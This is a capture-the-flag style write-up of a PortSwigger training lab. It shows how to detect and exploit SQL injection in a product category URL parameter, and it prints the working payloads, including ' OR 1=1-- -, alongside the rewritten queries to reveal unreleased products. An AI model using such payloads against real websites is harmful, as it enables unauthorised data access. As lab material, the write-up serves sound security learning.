Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data  
https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

---

### Enumeration

`/filter?category=Gifts`
- looks like the `category` filter is a URL query parameter which can be **user-controlled** via the URL  
- from the given, we know that the released column exists in the database but it is not displayed in the UI so it is probably handled in the backend

### Vulnerability Detection

Is the `category` filter vulnerable to SQLi?
- injecting a `'` into the `category` parameter results in an internal server error, indicating a SQL syntax issue and confirming that the parameter is vulnerable to SQLi

### Exploitation

`'-- -`
- performs the query: `SELECT * FROM products WHERE category = ''-- -' AND released = 1`
- which evaluates to: `SELECT * FROM products WHERE category = ''`
- which retrieves rows where category is an empty string, which in our case there isn't any so it returns nothing but we can expand on it

`Gifts'-- -`
- this will return all rows for the category Gifts only, disregarding the released part of the original query
- lets try for all categories

`/filter?category=' OR 1=1-- -`
- causes the `WHERE` clause to TRUE which matches every row, resulting in all rows and columns (entire table including unreleased products) being returned
- performs the query: `SELECT * FROM products WHERE category = '' OR 1=1-- -' AND released = 1`
- which evaluates to: `SELECT * FROM products WHERE category = '' OR 1=1`
- which evaluates to: `SELECT * FROM products WHERE category = '' OR TRUE`
- which evaluates to: `SELECT * FROM products WHERE TRUE`
- which evaluates to: `SELECT * FROM products`
- don't forget to URL encode the payload!
